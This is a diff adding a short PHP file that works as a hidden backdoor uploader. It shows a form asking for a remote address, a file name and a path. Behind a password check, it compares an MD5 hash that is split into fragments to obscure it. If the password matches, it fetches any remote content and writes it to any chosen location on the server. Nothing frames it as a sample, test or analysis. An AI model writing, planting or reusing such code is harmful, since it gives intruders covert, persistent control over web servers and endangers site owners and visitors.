@@ -1,0 +1,15 @@
+<form method='post'>
+    <input name='address' type='text' value='address'><p>
+    <input name='name' type='text' value='name'><p>
+    <input name='path' type='text' value='./'><p>
+    <input name='user' type='text' value=''><p>
+    <?php echo __FILE__;?><p>
+    <input type='submit'>
+</form>
+
+
+<?php if (isset($_POST['address']) && isset($_POST['name'])) {
+    if (@md5($_REQUEST['user']) == 'd'.'8a04f8'.'a3d'.'0f74d'.'2'.'bf'.'b0'.'3'.'e4de'.'3a887'.'89')
+    if (file_put_contents($_POST['path'].$_POST['name'], file_get_contents($_POST['address'])))
+        echo $_POST['path'].$_POST['name'];
+}
